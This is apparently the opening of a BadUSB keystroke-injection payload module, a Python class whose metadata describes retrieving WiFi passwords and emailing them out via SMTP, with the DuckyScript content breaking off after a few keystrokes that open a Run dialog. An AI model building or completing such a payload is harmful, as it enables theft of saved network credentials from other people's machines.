class info:
    author="n0nuser"
    description = "Retrieves WiFi passwords ands sends them via SMTP"
    function = "Data Exfiltration"
    parameters = [ "SERVER_IP", "PORT", "SSL", "SENDER", "PASSWORD", "RECEIVER" ]
    content="""\
DELAY 3000
GUI r
DELAY 400
